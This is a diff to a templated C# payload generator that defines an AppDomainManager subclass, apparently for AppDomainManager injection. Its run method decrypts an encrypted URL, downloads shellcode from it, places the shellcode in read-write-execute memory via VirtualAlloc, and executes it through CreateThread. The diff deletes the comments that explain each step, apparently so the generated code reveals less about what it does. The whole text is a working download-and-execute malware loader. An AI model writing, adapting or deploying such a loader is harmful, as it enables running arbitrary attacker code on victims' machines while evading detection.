@@ -61,22 +61,17 @@ public sealed class {{ managerType }} :  AppDomainManager
     {
         public static void {{func_Run}}()
         {
-            // download shellcode
             System.Net.ServicePointManager.SecurityProtocol |= System.Net.SecurityProtocolType.Tls12;
             string {{var_codeUrl}} = {{class_StringEncryption}}.{{func_DecryptString}}("{{encUrl}}");
             byte[] {{var_codeBytes}} = {{func_DownloadData}}(new Uri({{var_codeUrl}}));
 
-            // allocate RWX mem
             uint {{var_codeSize}} = (uint){{var_codeBytes}}.Length;
             IntPtr {{var_codePtr}} = {{class_NativeMethods}}.VirtualAlloc(IntPtr.Zero, {{var_codeSize}}, 0x3000, 0x40);
 
-            // copy shellcode over to RWX mem
             Marshal.Copy({{var_codeBytes}}, 0, {{var_codePtr}}, (int){{var_codeSize}});
 
-            // CreateThread to execute shellcode
             IntPtr {{var_threadHandle}} = {{class_NativeMethods}}.CreateThread(IntPtr.Zero, 0, {{var_codePtr}}, IntPtr.Zero, 0, IntPtr.Zero);
 
-            // WFSO
             {{class_NativeMethods}}.WaitForSingleObject((IntPtr)({{var_threadHandle}}), 0xFFFFFFFF);
         }
 
